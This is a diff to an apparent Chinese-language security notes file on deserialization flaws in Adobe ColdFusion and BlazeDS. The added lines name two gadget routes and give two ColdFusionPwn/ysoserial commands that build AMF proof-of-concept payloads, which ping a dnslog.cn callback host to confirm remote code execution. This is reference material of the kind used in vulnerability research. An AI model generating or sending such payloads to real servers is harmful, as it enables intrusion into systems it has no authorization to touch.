@@ -71,9 +71,19 @@ http://apache-flex-users.2333346.n4.nabble.com/CVE-2015-3269-Apache-Flex-BlazeDS
 - Adobe ColdFusion 11 update 11 and earlier
 - ColdFusion 10 Update 22 and earlier
 
+利用方式两种：
+- 实现Externalizable接口(`org.apache.axis2.util.MetaDataEntry`)
+- 任意Setter方法(`org.jgroups.blocks.ReplicatedTree`)
+
+分别对应这个工具的两个参数`-e/-s`。
+```bash
+$ java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.8-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 "ping 111.oqp5zz.dnslog.cn"  poc.amf
+$ java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.8-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -s CommonsBeanutils1 "ping 222.oqp5zz.dnslog.cn"  poc2.amf
+```
 
 ### [CVE-2017-5641] 反序列化 BlazeDS< 4.7.3
 - [[CVE-2017-5641] - DrayTek Vigor ACS 2 Java Deserialisation RCE](https://seclists.org/fulldisclosure/2018/Apr/40)
+
 
 
 ## 参考
